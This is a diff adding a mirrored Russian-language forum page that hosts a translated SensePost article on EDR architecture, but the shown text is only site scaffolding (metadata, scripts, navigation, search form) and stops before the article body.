@@ -1,0 +1,4130 @@
+<!DOCTYPE html>
+<html id="XF" lang="ru-RU" dir="LTR"
+	data-xf="2.3"
+	data-app="public"
+	data-variation="alternate"
+	data-color-scheme="dark"
+	data-template="xa_ams_article_view"
+	data-container-key="amsCategory-8"
+	data-content-key=""
+	data-logged-in="false"
+	data-cookie-prefix="xf_"
+	data-csrf="1758965463,4d315f9ba9acb38825e6e3ace4a076d2"
+	class="has-no-js template-xa_ams_article_view"
+	 data-run-jobs="">
+
+<!-- Mirrored from osint42.org/articles/arkhitektura-antivirusov-i-edr-sistem.48/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:35:34 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+	<link rel="icon" href="../../favicon.ico" type="image/x-icon">
+	
+	
+	
+
+	<meta charset="utf-8" />
+	<title>Архитектура антивирусов и EDR - систем | Osint42.Org - Безопасность и код</title>
+	<link rel="manifest" crossorigin="use-credentials" href="../../webmanifest.php">
+
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+	
+		
+			<meta name="theme-color" content="#0a1c29" />
+		
+	
+
+	<meta name="apple-mobile-web-app-title" content="Osint42.Org - Безопасность и код">
+	
+		<link rel="apple-touch-icon" href="../../data/assets/logo/192192.png">
+		
+
+	
+		
+		<meta property="og:title" content="Архитектура антивирусов и EDR - систем" />
+		<meta property="twitter:title" content="Архитектура антивирусов и EDR - систем" />
+	
+	
+		
+		<meta name="description" content="Перевод статьи:SensePost | Sensecon 23: from windows drivers to an almost fully working edr
+
+Кратко: Я хотел лучше понять EDR (Endpoint Detection and..." />
+		<meta property="og:description" content="Перевод статьи:SensePost | Sensecon 23: from windows drivers to an almost fully working edr
+
+Кратко: Я хотел лучше понять EDR (Endpoint Detection and Response), поэтому создал фиктивное EDR (dummy EDR) и расскажу об этом здесь.
+
+EDR (Endpoint..." />
+		<meta property="twitter:description" content="Перевод статьи:SensePost | Sensecon 23: from windows drivers to an almost fully working edr
+
+Кратко: Я хотел лучше понять EDR (Endpoint Detection and Response), поэтому создал фиктивное EDR (dummy..." />
+	
+	
+		<meta property="og:type" content="article" />
+	
+		<meta property="og:url" content="index.html" />
+	
+		<link rel="canonical" href="index.html" />
+	
+		
+		<meta property="og:image" content="1750610652237.png" />
+		<meta property="twitter:image" content="1750610652237.png" />
+		<meta property="twitter:card" content="summary_large_image" />
+	
+	
+
+	
+		
+	
+	
+	<meta property="og:site_name" content="Osint42.Org - Безопасность и код" />
+
+
+	
+	
+	
+	
+	
+	
+
+	
+	
+	
+		
+	
+	
+
+	<link rel="stylesheet" href="../../cssf1bd.css?css=public%3Anormalize.css%2Cpublic%3Afa.css%2Cpublic%3Avariations.less%2Cpublic%3Acore.less%2Cpublic%3Aapp.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=650febe17d52673553ff8fcab924bc52ae7c26c5" />
+
+	<link rel="stylesheet" href="../../css002d.css?css=public%3Aalnb_navigation.less%2Cpublic%3Abb_code.less%2Cpublic%3Alightbox.less%2Cpublic%3Anotices.less%2Cpublic%3Ashare_controls.less%2Cpublic%3Axa_ams.less%2Cpublic%3Aextra.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=f5241ce3061674c4a2bfd77343d9ccd4f3736920" />
+
+
+	
+		<script data-cfasync="false" src="../../js/xf/preamble.minf74f.js?_v=01eb82fa"></script>
+	
+
+	
+	<script data-cfasync="false" src="../../js/vendor/vendor-compiledf74f.js?_v=01eb82fa" defer></script>
+	<script data-cfasync="false" src="../../js/xf/core-compiledf74f.js?_v=01eb82fa" defer></script>
+
+	<script data-cfasync="false">
+		XF.ready(() =>
+		{
+			XF.extendObject(true, XF.config, {
+				// 
+				userId: 0,
+				enablePush: true,
+				pushAppServerKey: 'BA479YFsUh5Dh5bOkTEWM7LoORrEgUroE2adYpgA6_NLt6AmfJFBdCBxt_i9NhpAIXJviINVU4JDqWxez0NnB-w',
+				url: {
+					fullBase: 'https://osint42.org/',
+					basePath: '/',
+					css: '/css.php?css=__SENTINEL__&s=1&l=2&d=1758392320',
+					js: '/js/__SENTINEL__?_v=01eb82fa',
+					icon: '/data/local/icons/__VARIANT__.svg?v=1757401797#__NAME__',
+					iconInline: '/styles/fa/__VARIANT__/__NAME__.svg?v=5.15.3',
+					keepAlive: '/login/keep-alive'
+				},
+				cookie: {
+					path: '/',
+					domain: '',
+					prefix: 'xf_',
+					secure: true,
+					consentMode: 'disabled',
+					consented: ["optional","_third_party"]
+				},
+				cacheKey: '60356f7aa4f82ca98e605b4e87a0a057',
+				csrf: '1758965463,4d315f9ba9acb38825e6e3ace4a076d2',
+				js: {"\/js\/xf\/lightbox-compiled.js?_v=01eb82fa":true,"\/js\/xf\/code_block-compiled.js?_v=01eb82fa":true,"\/js\/copycode\/copycode.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/4.4.1\/socket.io.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/socket-conv.min.js?_v=01eb82fa":true},
+				fullJs: false,
+				css: {"public:alnb_navigation.less":true,"public:bb_code.less":true,"public:lightbox.less":true,"public:notices.less":true,"public:share_controls.less":true,"public:xa_ams.less":true,"public:extra.less":true},
+				time: {
+					now: 1758965463,
+					today: 1758920400,
+					todayDow: 6,
+					tomorrow: 1759006800,
+					yesterday: 1758834000,
+					week: 1758402000,
+					month: 1756674000,
+					year: 1735678800
+				},
+				style: {
+					light: 'default',
+					dark: 'alternate',
+					defaultColorScheme: 'light'
+				},
+				borderSizeFeature: '3px',
+				fontAwesomeWeight: 'r',
+				enableRtnProtect: true,
+				
+				enableFormSubmitSticky: true,
+				imageOptimization: '0',
+				imageOptimizationQuality: 0.85,
+				uploadMaxFilesize: 3145728,
+				uploadMaxWidth: 0,
+				uploadMaxHeight: 0,
+				allowedVideoExtensions: ["m4v","mov","mp4","mp4v","mpeg","mpg","ogv","webm"],
+				allowedAudioExtensions: ["mp3","opus","ogg","wav"],
+				shortcodeToEmoji: true,
+				visitorCounts: {
+					conversations_unread: '0',
+					alerts_unviewed: '0',
+					total_unread: '0',
+					title_count: true,
+					icon_indicator: true
+				},
+				jsMt: {"xf\/action.js":"dc2375bf","xf\/embed.js":"d3d00259","xf\/form.js":"d3d00259","xf\/structure.js":"dc2375bf","xf\/tooltip.js":"d3d00259"},
+				jsState: {},
+				publicMetadataLogoUrl: 'https://osint42.org/data/assets/logo/192192.png',
+				publicPushBadgeUrl: 'https://osint42.org/styles/default/xenforo/bell.png'
+			})
+
+			XF.extendObject(XF.phrases, {
+				// 
+"svStandardLib_time.day": "{count} day",
+"svStandardLib_time.days": "{count} дней",
+"svStandardLib_time.hour": "{count} hour",
+"svStandardLib_time.hours": "{count} часов",
+"svStandardLib_time.minute": "{count} минут",
+"svStandardLib_time.minutes": "{count} минут",
+"svStandardLib_time.month": "{count} month",
+"svStandardLib_time.months": "{count} месяцев",
+"svStandardLib_time.second": "{count} second",
+"svStandardLib_time.seconds": "{count} секунд",
+"svStandardLib_time.week": "time.week",
+"svStandardLib_time.weeks": "{count} недель",
+"svStandardLib_time.year": "{count} year",
+"svStandardLib_time.years": "{count} лет",
+copy_to_clipboard: "Скопировать в буфер обмена",
+text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
+				date_x_at_time_y:     "{date} в {time}",
+				day_x_at_time_y:      "{day} в {time}",
+				yesterday_at_x:       "Вчера в {time}",
+				x_minutes_ago:        "{minutes} мин. назад",
+				one_minute_ago:       "Минуту назад",
+				a_moment_ago:         "Только что",
+				today_at_x:           "Сегодня в {time}",
+				in_a_moment:          "Через секунду",
+				in_a_minute:          "Через минуту",
+				in_x_minutes:         "Через {minutes} мин.",
+				later_today_at_x:     "Сегодня в {time}",
+				tomorrow_at_x:        "Завтра в {time}",
+				short_date_x_minutes: "{minutes} м.",
+				short_date_x_hours:   "{hours} ч.",
+				short_date_x_days:    "{days} д.",
+
+				day0: "Воскресенье",
+				day1: "Понедельник",
+				day2: "Вторник",
+				day3: "Среда",
+				day4: "Четверг",
+				day5: "Пятница",
+				day6: "Суббота",
+
+				dayShort0: "Вс",
+				dayShort1: "Пн",
+				dayShort2: "Вт",
+				dayShort3: "Ср",
+				dayShort4: "Чт",
+				dayShort5: "Пт",
+				dayShort6: "Сб",
+
+				month0: "Январь",
+				month1: "Февраль",
+				month2: "Март",
+				month3: "Апрель",
+				month4: "Май",
+				month5: "Июнь",
+				month6: "Июль",
+				month7: "Август",
+				month8: "Сентябрь",
+				month9: "Октябрь",
+				month10: "Ноябрь",
+				month11: "Декабрь",
+
+				active_user_changed_reload_page: "Ваша сессия истекла. Перезагрузите страницу.",
+				server_did_not_respond_in_time_try_again: "Сервер не ответил вовремя. Пожалуйста, попробуйте снова.",
+				oops_we_ran_into_some_problems: "Упс! Мы столкнулись с некоторыми проблемами.",
+				oops_we_ran_into_some_problems_more_details_console: "Упс! Мы столкнулись с некоторыми проблемами. Пожалуйста, попробуйте позже. Более детальную информацию об ошибке Вы можете посмотреть в консоли браузера",
+				file_too_large_to_upload: "Файл слишком большой для загрузки.",
+				uploaded_file_is_too_large_for_server_to_process: "Загружаемый файл слишком большой для обработки сервером.",
+				files_being_uploaded_are_you_sure: "Файлы ещё загружаются. Вы уверены, что хотите отправить эту форму?",
+				attach: "Прикрепить файлы",
+				rich_text_box: "Текстовое поле с поддержкой форматирования",
+				close: "Закрыть",
+				link_copied_to_clipboard: "Ссылка скопирована в буфер обмена.",
+				text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
+				loading: "Загрузка...",
+				you_have_exceeded_maximum_number_of_selectable_items: "Вы превысили максимальное количество выбираемых элементов.",
+
+				processing: "Обработка",
+				'processing...': "Обработка...",
+
+				showing_x_of_y_items: "Показано {count} из {total} элементов",
+				showing_all_items: "Показаны все элементы",
+				no_items_to_display: "Нет элементов для отображения",
+
+				number_button_up: "Увеличить",
+				number_button_down: "Уменьшить",
+
+				push_enable_notification_title: "Push-уведомления для сайта Osint42.Org - Безопасность и код успешно включены",
+				push_enable_notification_body: "Спасибо за включение push-уведомлений!",
+
+				pull_down_to_refresh: "Потяните вниз для обновления",
+				release_to_refresh: "Отпустите для обновления",
+				refreshing: "Обновление..."
+			})
+		})
+	
+
+window.addEventListener('DOMContentLoaded',()=>{XF.Push.updateUserSubscriptionParent=XF.Push.updateUserSubscription;XF.Push.updateUserSubscription=function(b,a){"unsubscribe"===a&&XF.browser.safari&&XF.Push.setPushHistoryUserIds({});XF.Push.updateUserSubscriptionParent(b,a)}});
+</script>
+
+	<script data-cfasync="false" src="../../js/xf/lightbox-compiledf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../js/xf/code_block-compiledf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../js/copycode/copycode.minf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../js/DCom/LiveContent/4.4.1/socket.io.minf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../js/DCom/LiveContent/socket-conv.minf74f.js?_v=01eb82fa" defer></script>
+
+
+
+	
+		<link rel="icon" type="image/png" href="../../data/assets/logo/favicon.png" sizes="32x32" />
+	
+
+	
+	
+</head>
+<body data-template="xa_ams_article_view">
+
+<div class="p-pageWrapper" id="top">
+
+	
+
+	<header class="p-header" id="header">
+		<div class="p-header-inner">
+			<div class="p-header-content">
+				<div class="p-header-logo p-header-logo--image">
+					<a href="../../forums/index.html">
+						
+
+	
+
+	
+		
+		
+
+		
+	
+		
+		
+
+		
+	
+
+	
+
+	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;}}">
+		
+		
+		
+
+		
+
+		<img src="../../data/assets/logo_alternate/osint4242.png" srcset="/data/assets/logo_alternate/osint4242.png 2x" width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
+	</picture>
+
+
+					</a>
+				</div>
+
+				
+			</div>
+		</div>
+	</header>
+
+	
+	
+
+	
+		<div class="p-navSticky p-navSticky--primary" data-xf-init="sticky-header">
+			
+		<nav class="p-nav">
+			<div class="p-nav-inner">
+				<button type="button" class="button button--plain p-nav-menuTrigger" data-xf-click="off-canvas" data-menu=".js-headerOffCanvasMenu" tabindex="0" aria-label="Меню"><span class="button-text">
+					<i aria-hidden="true"></i>
+				</span></button>
+
+				<div class="p-nav-smallLogo">
+					<a href="../../forums/index.html">
+						
+
+	
+
+	
+		
+		
+
+		
+	
+		
+		
+
+		
+	
+
+	
+
+	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:null},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:null}}">
+		
+		
+		
+
+		
+
+		<img src="../../data/assets/logo_alternate/osint4242.png"  width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
+	</picture>
+
+
+					</a>
+				</div>
+
+				<div class="p-nav-scroller hScroller" data-xf-init="h-scroller" data-auto-scroll=".p-navEl.is-selected">
+					<div class="hScroller-scroll">
+						<ul class="p-nav-list js-offCanvasNavSource">
+							
+								<li>
+									
+	<div class="p-navEl is-selected" data-has-children="true">
+	
+
+		
+	
+	<a href="../../index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="xa_ams">Статьи</a>
+
+
+		<a data-xf-key="1"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../whats-new/ams-articles/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xa_amsNewArticles">Новые статьи</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/ams-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xa_amsNewComments">Новые комментарии</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../authors/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="xa_amsAuthorList">Список авторов</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../forums/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="forums">Форум</a>
+
+
+		<a data-xf-key="2"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../whats-new/posts/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="newPosts">Новые сообщения</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../search/index4009.html?type=post"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="searchForums">Поиск по форуму</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../whats-new/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="whatsNew">Что нового</a>
+
+
+		<a data-xf-key="3"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../whats-new/posts/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="whatsNewPosts">Новые сообщения</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/ams-articles/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xaAmsWhatsNewNewArticles">Новые статьи</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/media/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgWhatsNewNewMedia">Новые медиа</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/ams-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xaAmsWhatsNewArticleComments">Новые комментарии к статье</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../media/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="xfmg">Медиа</a>
+
+
+		<a data-xf-key="4"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../whats-new/media/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgNewMedia">Новые медиа</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/media-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgNewComments">Новые комментарии</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../search/index4784.html?type=xfmg_media"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="xfmgSearchMedia">Поиск медиа</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="https://osint42.org/members/"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="members">Пользователи</a>
+
+
+		<a data-xf-key="5"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="https://osint42.org/online/"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="currentVisitors">Сейчас на форуме</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+						</ul>
+					</div>
+				</div>
+
+				<div class="p-nav-opposite">
+					<div class="p-navgroup p-account p-navgroup--guest">
+						
+							<a href="../../login/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--logIn"
+								data-xf-click="overlay" data-follow-redirects="on">
+								<span class="p-navgroup-linkText">Вход</span>
+							</a>
+							
+								<a href="../../register/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--register"
+									data-xf-click="overlay" data-follow-redirects="on">
+									<span class="p-navgroup-linkText">Регистрация</span>
+								</a>
+							
+						
+					</div>
+					
+					
+    <a href="https://osint42.org/misc/style-variation"
+       class="p-navgroup-link p-navgroup-link--iconic js-styleVariationsLink"
+       data-xf-click="menu"
+       data-menu-pos-ref="< .p-navgroup"
+       aria-label=" Выбор стиля"
+       aria-expanded="false"
+       aria-haspopup="true"
+       title=" Выбор стиля">
+        <i aria-hidden="true">
+            <i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+        </i>
+        <span class="p-navgroup-linkText"> Выбор стиля</span>
+    </a>
+
+    <div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+        <div class="menu-content js-styleVariationsMenu">
+            
+
+	
+		
+
+	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965463%2C4d315f9ba9acb38825e6e3ace4a076d2"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="">
+
+		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>
+
+		
+			Системный
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965463%2C4d315f9ba9acb38825e6e3ace4a076d2"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="default">
+
+		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>
+
+		
+			Светлый
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965463%2C4d315f9ba9acb38825e6e3ace4a076d2"
+		class="menu-linkRow is-selected"
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="alternate">
+
+		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+
+		
+			Тёмный
+		
+	</a>
+
+	
+
+	
+		
+	
+
+        </div>
+    </div>
+
+
+
+					<div class="p-navgroup p-discovery">
+						<a href="../../whats-new/index.html"
+							
+
+	class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--whatsnew"
+
+							aria-label="Что нового"
+							title="Что нового">
+							<i aria-hidden="true"></i>
+							<span class="p-navgroup-linkText">Что нового</span>
+						</a>
+
+						
+							<a href="../../search/index.html"
+								class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--search"
+								data-xf-click="menu"
+								data-xf-key="/"
+								aria-label="Поиск"
+								aria-expanded="false"
+								aria-haspopup="true"
+								title="Поиск">
+								<i aria-hidden="true"></i>
+								<span class="p-navgroup-linkText">Поиск</span>
+							</a>
+							<div class="menu menu--structural menu--wide" data-menu="menu" aria-hidden="true">
+								<form action="https://osint42.org/search/search" method="post"
+									class="menu-content"
+									data-xf-init="quick-search">
+
+									<h3 class="menu-header">Поиск</h3>
+									
+									<div class="menu-row">
+										
+											<div class="inputGroup inputGroup--joined">
+												<input type="text" class="input" name="keywords" data-acurl="/search/auto-complete" placeholder="Поиск..." aria-label="Поиск" data-menu-autofocus="true" />
+												
+			<select name="constraints" class="js-quickSearch-constraint input" aria-label="Поиск в">
+				<option value="">Везде</option>
+<option value="{&quot;search_type&quot;:&quot;ams_article&quot;}">Статьи</option>
+<option value="{&quot;search_type&quot;:&quot;ams_article&quot;,&quot;c&quot;:{&quot;categories&quot;:[8],&quot;child_categories&quot;:1}}">Эта категория</option>
+
+			</select>
+		
+											</div>
+										
+									</div>
+
+									
+									<div class="menu-row">
+										<label class="iconic"><input type="checkbox"  name="c[title_only]" value="1" /><i aria-hidden="true"></i><span class="iconic-label">Искать только в заголовках
+
+													
+													<span tabindex="0" role="button"
+														data-xf-init="tooltip" data-trigger="hover focus click" title="Теги также будут учитываться">
+
+														<i class="fa--xf far fa-question-circle  u-muted u-smaller"><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Примечание</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#question-circle"></use></svg></i>
+													</span></span></label>
+
+									</div>
+									
+									<div class="menu-row">
+										<div class="inputGroup">
+											<span class="inputGroup-text" id="ctrl_search_menu_by_member">Автор:</span>
+											<input type="text" class="input" name="c[users]" data-xf-init="auto-complete" placeholder="Пользователь" aria-labelledby="ctrl_search_menu_by_member" />
+										</div>
+									</div>
+									<div class="menu-footer">
+									<span class="menu-footer-controls">
+										<button type="submit" class="button button--icon button--icon--search button--primary"><i class="fa--xf far fa-search "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#search"></use></svg></i><span class="button-text">Найти</span></button>
+										<button type="submit" class="button " name="from_search_menu"><span class="button-text">Расширенный поиск...</span></button>
+									</span>
+									</div>
+
+									<input type="hidden" name="_xfToken" value="1758965463,4d315f9ba9acb38825e6e3ace4a076d2" />
+								</form>
+							</div>
+						
+					</div>
+				</div>
+			</div>
+		</nav>
+	
+		</div>
+		
+		
+			<div class="p-sectionLinks">
+				<div class="p-sectionLinks-inner hScroller" data-xf-init="h-scroller">
+					<div class="hScroller-scroll">
+						<ul class="p-sectionLinks-list">
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../../whats-new/ams-articles/index.html"
+	class="p-navEl-link "
+	 rel="nofollow"
+	data-xf-key="alt+1"
+	data-nav-id="xa_amsNewArticles">Новые статьи</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../../whats-new/ams-comments/index.html"
+	class="p-navEl-link "
+	 rel="nofollow"
+	data-xf-key="alt+2"
+	data-nav-id="xa_amsNewComments">Новые комментарии</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../authors/index.html"
+	class="p-navEl-link "
+	
+	data-xf-key="alt+3"
+	data-nav-id="xa_amsAuthorList">Список авторов</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+						</ul>
+					</div>
+				</div>
+			</div>
+			
+	
+		
+
+	<div class="offCanvasMenu offCanvasMenu--nav js-headerOffCanvasMenu" data-menu="menu" aria-hidden="true" data-ocm-builder="navigation">
+		<div class="offCanvasMenu-backdrop" data-menu-close="true"></div>
+		<div class="offCanvasMenu-content">
+			<div class="offCanvasMenu-header">
+				Меню
+				<a class="offCanvasMenu-closer" data-menu-close="true" role="button" tabindex="0" aria-label="Закрыть"></a>
+			</div>
+			
+				<div class="p-offCanvasRegisterLink">
+					<div class="offCanvasMenu-linkHolder">
+						<a href="../../login/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
+							Вход
+						</a>
+					</div>
+					<hr class="offCanvasMenu-separator" />
+					
+						<div class="offCanvasMenu-linkHolder">
+							<a href="../../register/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
+								Регистрация
+							</a>
+						</div>
+						<hr class="offCanvasMenu-separator" />
+					
+				</div>
+			
+			<div class="js-offCanvasNavTarget"></div>
+			<div class="offCanvasMenu-installBanner js-installPromptContainer" style="display: none;" data-xf-init="install-prompt">
+				<div class="offCanvasMenu-installBanner-header">Установить приложение</div>
+				<button type="button" class="button js-installPromptButton"><span class="button-text">Установить</span></button>
+				<template class="js-installTemplateIOS">
+					<div class="js-installTemplateContent">
+						<div class="overlay-title">Как установить приложение на iOS</div>
+						<div class="block-body">
+							<div class="block-row">
+								<p>
+									Следуйте инструкциям в видео ниже, чтобы узнать, как установить наш сайт как веб-приложение на главный экран вашего устройства.
+								</p>
+								<p style="text-align: center">
+									<video src="../../styles/default/xenforo/add_to_home_new.mp4"
+										width="280" height="480" autoplay loop muted playsinline></video>
+								</p>
+								<p>
+									<small><strong>Примечание:</strong> Эта функция может быть недоступна в некоторых браузерах.</small>
+								</p>
+							</div>
+						</div>
+					</div>
+				</template>
+			</div>
+		</div>
+	</div>
+
+	<div class="p-body">
+		<div class="p-body-inner">
+			<!--XF:EXTRA_OUTPUT-->
+
+
+			
+				
+	
+		
+		
+
+		<ul class="notices notices--block  js-notices"
+			data-xf-init="notices"
+			data-type="block"
+			data-scroll-interval="6">
+
+			
+				
+	<li class="notice js-notice notice--primary notice--hasImage"
+		data-notice-id="1"
+		data-delay-duration="0"
+		data-display-duration="0"
+		data-auto-dismiss=""
+		data-visibility="">
+
+		
+			<div class="notice-image"><img src="../../data/assets/notice_images/c7eb1746-6291-4d37-b72b-8e3b5cfd1303.png" alt="" /></div>
+		
+		<div class="notice-content">
+			
+			<div class="block"
+     style="border:1px solid #ccc;
+            border-radius:8px;
+            padding:min(4vw,15px);
+            background:var(--xf-contentBg);
+            box-shadow:0 0 8px rgba(0,0,0,.1);
+            width:100%;
+            max-width:clamp(480px,90vw,1200px);
+            margin:0 auto;
+            box-sizing:border-box;
+            overflow:hidden;">
+
+  <div class="block-container">
+    <h3 class="block-header"
+        style="font-size:clamp(1rem,4vw,1.125rem);
